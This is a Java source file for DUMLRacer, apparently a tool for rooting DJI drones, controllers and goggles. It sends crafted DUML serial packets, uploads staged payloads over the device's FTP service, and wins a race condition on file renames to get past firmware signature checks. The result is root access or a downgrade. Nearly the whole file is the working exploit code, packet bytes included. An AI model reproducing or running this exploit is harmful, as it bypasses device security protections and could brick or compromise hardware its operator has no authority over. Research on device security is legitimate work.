package com.cunninglogic.dumlracer;

import com.fazecast.jSerialComm.SerialPort;
import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPFile;

import java.io.*;
import java.nio.ByteBuffer;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

public class Main {

    private static SerialPort activePort = null;

    private static ClassLoader classLoader;

    private static FTPClient ftpClient;

    private static boolean isRC = false;
    private static boolean isGL = false;

    public static void main(String[] args) throws IOException {


        System.out.println("DUMLRacer 1.1.1");
        System.out.println("Copyright 2017/2018 APIs Research LLC");
        System.out.println("jcase in the house!\n");

        System.out.println("This software comes with NO WARRANTY AT ALL. If it bricks your equipment, your fault not" +
                " anyone else's.");
        System.out.println("By using this software, you agree to take full responsibility of any harm, damage, injury or " +
                "loss of life from using your equipment improperly.");
        System.out.println("Do not use this software to illegally modify your equipment. Do not redistribute this software. " +
                "Do not use it in any ");
        System.out.println("commercial venture without first getting written permission from APIs Research LLC.\n");


        if (args.length != 1 || (!args[0].equals("AC") && !args[0].equals("RC") && !args[0].equals("GL"))) {
            printHelp();
            return;
        }

        System.out.println("I either need to recoup the cost of my Mavic, or sell it. If I can recoup it, I can keep hacking");
        System.out.println("PayPal Donations - > jcase@cunninglogic.com");
        System.out.println("Bitcoin Donations - > 1LrunXwPpknbgVYcBJyDk6eanxTBYnyRKN");
        System.out.println("Bitcoin Cash Donations - > 1LrunXwPpknbgVYcBJyDk6eanxTBYnyRKN");
        System.out.println("Amazon giftcards, plain thank yous or anything else -> jcase@cunninglogic.com");
        System.out.println("Any donations in excess of the drone cost, will go to Special Olympics!\n");

        System.out.println("****Attention****");
        System.out.println("After a successful run, you will need to reboot the device.");
        System.out.println("After rebooting you can use adb for root access, or you can downgrade.\n");

        System.out.println(args[0] + " Mode");

        if (args[0].equals("RC")) {
            isRC = true;

        } else if (args[0].equals("GL")) {
            isGL = true;
        }

        System.out.println();

        classLoader = Main.class.getClassLoader();


        //Serial Port Chooser
        int count = 1;

        System.out.println("Choose target port: (* suggested port)");
        for (SerialPort s : SerialPort.getCommPorts()) {
            if (s.getDescriptivePortName().contains("DJI")) {
                System.out.print("*");
            }


            System.out.println("\t[" + count + "] " + s.getSystemPortName() + " : " + s.getDescriptivePortName());
            count++;
        }

        System.out.println("\t[E] Exit");

        String str;
        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
        System.out.print("Choose port: ");
        while (true) {
            str = br.readLine();
            try {

                if (str.toLowerCase().toLowerCase().equals("e")) {
                    System.out.println("Exiting");
                    System.exit(0);
                }


                int port = Integer.parseInt(str.trim());

                if ((port > count) || (port < 1)) {
                    System.out.println("[!] Invalid port selection");
                    System.out.print("Choose port: ");
                } else {
                    activePort = SerialPort.getCommPorts()[port - 1];
                    System.out.println("Using Port: " + activePort.getSystemPortName());
                    break;
                }
            } catch (NumberFormatException e) {
                System.out.println("[!] Invalid port selection");
                System.out.print("Choose port: ");
            }
        }

        connect();



        //Payloads in array so we can get md5sum
        byte[] payload1 = isToArray(classLoader.getResourceAsStream("resources/stage1.bin"));
        byte[] payload2 = isToArray(classLoader.getResourceAsStream("resources/stage2.bin"));


        //Stage one
        System.out.println("Sending upgrade command");
        write(getUpgradePacket());
        write(getReportPacket());

        System.out.println("Uploading payload 1");
        uploadFile(classLoader.getResourceAsStream("resources/stage1.bin"));

        try {
            Thread.sleep(3000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        write(getFileSizePacket(payload1.length));

        System.out.println("Exploiting");
        write(getHashPacket(payload1));


        //First race
        System.out.println("Race 1 has started");
        boolean flag = false;
        while (!flag) {
            FTPFile[] files = ftpClient.listFiles("/upgrade/upgrade/signimgs");

            for (FTPFile f : files) {
                if (f.toString().contains("flag")) {
                    flag = true;
                    break;
                }
            }
        }

        ftpClient.rename("/upgrade/upgrade/signimgs/jcase","/upgrade/upgrade/jcase");

        //Some probably completely unneeded packet that I dont recall putting in here, or know what it does
        write(new byte[]{0x55, 0x0D, 0x04, 0x33, 0x2A, 0x28, 0x68, 0x57, 0x00, 0x00, 0x0A, (byte)0xF0, 0x3C});
        System.out.println("You won race one, taking a breather for 10 seconds");

        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        activePort.closePort();
        ftpClient.disconnect();

        try {
            Thread.sleep(3000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        connect();

        try {
            Thread.sleep(2000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        System.out.println("You feel great, like you could race again!");

        //Stage two
        System.out.println("Sending upgrade command");
        write(getUpgradePacket());
        write(getReportPacket());

        System.out.println("Uploading payload 2");
        uploadFile(classLoader.getResourceAsStream("resources/stage2.bin"));

        try {
            Thread.sleep(3000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        write(getFileSizePacket(payload2.length));

        System.out.println("Exploiting");
        write(getHashPacket(payload2));

        //First race
        System.out.println("Race 2 has started");

        flag = false;
        while (!flag) {
            FTPFile[] files = ftpClient.listFiles("/upgrade/upgrade/signimgs");

            for (FTPFile f : files) {
                if (f.toString().contains("dummy")) {
                    flag = true;
                    break;
                }
            }
        }

        boolean winner = ftpClient.rename("/upgrade/upgrade/jcase","/upgrade/upgrade/signimgs/jcase");

        if (winner) {
            System.out.println("You are in the lead!");
        } else {
            System.out.println("You fell down and skinned your knee, reboot the target and try again!");
            activePort.closePort();
            ftpClient.disconnect();
            return;
        }

        flag = false;
        while (!flag) {
            FTPFile[] files = ftpClient.listFiles("/upgrade/upgrade/signimgs");

            for (FTPFile f : files) {
                if (f.toString().contains("wellhello")) {
                    flag = true;
                    break;
                }
            }
        }

        ftpClient.deleteFile("/upgrade/upgrade/signimgs/jcase");


        winner = false;

        int timeout = 0;
        while (!winner) {
            FTPFile[] files = ftpClient.listFiles("/upgrade/upgrade/signimgs");
            if (files.length == 0) {
                winner = true;
                break;
            }
            System.out.print(".");
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }

            timeout +=1;

            if (timeout > 60) {
                System.out.println();
                System.out.println("Race timed out, unsure who won. Reboot and check");
                System.out.println("Reboot the target device. and try using adb (for root) or downgrading.");
                ftpClient.disconnect();
                activePort.closePort();
                return;
            }
        }

        System.out.println();
        System.out.println("Looks like you won!.");
        System.out.println("Reboot the target device. and try using adb (for root) or downgrading.");
        activePort.closePort();
        ftpClient.disconnect();

    }

    private static byte[] isToArray(InputStream is) throws IOException {

        ByteArrayOutputStream buffer = new ByteArrayOutputStream();

        int nRead;
        byte[] data = new byte[16384];

        while ((nRead = is.read(data, 0, data.length)) != -1) {
            buffer.write(data, 0, nRead);
        }

        buffer.flush();

        return buffer.toByteArray();
    }
    private static void write(byte[] packet) {
        activePort.writeBytes(packet,packet.length);
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    private static void connect () {
        if (activePort == null) {
            System.out.println("Couldn't find port, exiting");
            return;
        }


        if (activePort.isOpen()) {
            System.out.println(activePort.getSystemPortName() + " is already open");
            activePort.closePort(); //meh why not
            return;
        }

        if (!activePort.openPort()) {
            System.out.println("Couldn't open port, exiting");
            activePort.closePort(); //meh why not
            return;
        }

        activePort.setBaudRate(115200);
    }

    private static void printHelp() {
        System.out.println("java -jar DUMLRacer.jar <mode>");
        System.out.println("Modes:");
        System.out.println("AC - target AC");
        System.out.println("RC - target RC");
        System.out.println("GL - target GL");
    }

    public static void uploadFile(InputStream payload) throws IOException {
        if (ftpClient == null) {
            ftpClient = new FTPClient();
        }

        if (!ftpClient.isConnected()) {
            ftpClient.connect("192.168.42.2", 21);
            ftpClient.login("nouser","nopass");
            ftpClient.enterLocalPassiveMode();
        }

        ftpClient.setFileType(ftpClient.BINARY_FILE_TYPE);

        boolean done = ftpClient.storeFile("/upgrade/dji_system.bin", payload);
        payload.close();
        if (!done) {
            System.out.println("Failed to upload payload.");
            System.exit(-1);
        }
    }

    private static byte[] getFileSizePacket(int fileSize) {
        byte[] packet = new byte[] {0x55, 0x1A, 0x04, (byte)0xB1, 0x2A, 0x28, 0x6B, 0x57, 0x40, 0x00, 0x08, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04};

        if (isRC) {
            packet = new byte[] {0x55, 0x1A, 0x04, (byte)0xB1, 0x2A, 0x2D, (byte)0xEC, 0x27, 0x40, 0x00, 0x08, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04};
        }

        if (isGL) {
            packet = new byte[] {0x55, 0x1A, 0x04, (byte)0xB1, 0x2A, 0x3C, (byte)0xFD, 0x35, 0x40, 0x00, 0x08, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x04};
        }

        byte[] size = ByteBuffer.allocate(4).putInt(fileSize).array();

        packet[12] = size[3];
        packet[13] = size[2];
        packet[14] = size[1];
        packet[15] = size[0];

        return  CRC.pktCRC(packet);
    }

    private static byte[] getHashPacket(byte[] payload) {
        byte[] packet  = new byte[] {0x55, 0x1E, 0x04, (byte)0x8A, 0x2A, 0x28, (byte)0xF6, 0x57, 0x40, 0x00, 0x0A, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

        if (isRC) {
            packet = new byte[] {0x55, 0x1E, 0x04, (byte)0x8A, 0x2A, 0x2D, 0x02, 0x28, 0x40, 0x00, 0x0A, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        }

        if (isGL) {
            packet = new byte[] {0x55, 0x1E, 0x04, (byte)0x8A, 0x2A, 0x3C, 0x5B, 0x36, 0x40, 0x00, 0x0A, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
        }

        byte[] md5 = payload;

        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            md5 = md.digest(md5);
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }

        System.arraycopy(md5,0, packet, 12, 16);

        return  CRC.pktCRC(packet);
    }

    private static byte[] getUpgradePacket() {

        byte[] packet = new byte[] {0x55, 0x16, 0x04, (byte)0xFC, 0x2A, 0x28, 0x65, 0x57, 0x40, 0x00, 0x07, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x27, (byte)0xD3};

        if (isRC) {
            packet = new byte[] {0x55, 0x16, 0x04, (byte)0xFC, 0x2A, 0x2D, (byte)0xE7, 0x27, 0x40, 0x00, 0x07, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, (byte)0x9F, 0x44};
        }

        if (isGL) {
            packet = new byte[] {0x55, 0x16, 0x04, (byte)0xFC, 0x2A, 0x3C, (byte)0xF7, 0x35, 0x40, 0x00, 0x07, 0x00, 
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x29};
        }

        return packet;
    }

    private static byte[] getReportPacket() {

        byte[] packet = new byte[] {0x55, 0x0E, 0x04, 0x66, 0x2A, 0x28, 0x68, 0x57, 0x40, 0x00, 0x0C, 0x00, (byte)0x88,
                0x20};

        if (isRC) {
            packet = new byte[] {0x55, 0x0E, 0x04, 0x66, 0x2A, 0x2D, (byte)0xEA, 0x27, 0x40, 0x00, 0x0C, 0x00, 0x2C,
                    (byte)0xC8};
        }

        if (isGL) {
            packet = new byte[] {0x55, 0x0E, 0x04, 0x66, 0x2A, 0x3C, (byte)0xFA, 0x35, 0x40, 0x00, 0x0C, 0x00, 0x48, 0x02};
        }

        return packet;
    }

}

